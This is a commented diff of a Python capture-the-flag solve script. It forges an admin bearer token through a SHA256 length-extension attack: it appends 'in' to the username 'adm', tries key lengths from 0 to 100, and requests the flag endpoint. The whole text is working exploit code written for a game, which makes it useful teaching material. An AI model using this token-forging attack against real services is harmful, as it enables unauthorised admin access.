@@ -166,25 +166,47 @@ def runExtend(Data, Append, Key_length, Signature):
 from requests import get, post
 import base64
 
+# Get the length of a random SHA256 hash
 HASH_LEN = len("96902f573a8e08faf500b72e368ebad9acda5f611274c7de4108b92d6ba40c81")
 
-host = "https://hwvwoasy.web.ctf.uscybergames.com"
+# The host of the challenge website
+host = "https://octbfouj.web.ctf.uscybergames.com"
 
+# Register with credentials adm:test
 print(post(host + "/register", json={"username": "adm", "password": "test"}).text)
+
+# Log in with those credentials
 x = post(host + "/login", json={"username": "adm", "password": "test"}).json()
+# Get our token
 token = x['token']
+
+# Set up the Authorization header with the token as a Bearer token
 headers = {"Authorization": "Bearer " + str(token)}
 print(str(token))
+
+# Decode our original token data
 original_data = base64.b64decode(token).decode()[:-HASH_LEN]
 print(original_data)
+
+# Get the original hash
 original_hash = base64.b64decode(token).decode()[-HASH_LEN:]
 print(original_hash)
+
+# Test by getting our notes (should be empty)
 print(get(host + "/notes", headers=headers).text)
 
-for i in range(100):    
+# We don't know the key length, so try from 0 to 100
+for i in range(100):
+	# Generate our new message and hash by adding "in" to "adm" to forge the admin's token
     new_message, new_hash = runExtend(original_data.encode(), b"in", i, original_hash)
+    # Add our hash to the end of our token
     new_token = new_message + str(new_hash).encode()
+    # Base64 encode
     full_token= base64.b64encode(new_token).decode()
+    
+    # Set our new Bearer token
     headers = {"Authorization": "Bearer " + str(full_token)}
+    
+    # Try getting the admin's notes list
     res = get(host + "/notes/flag", headers=headers).text
     print(res)
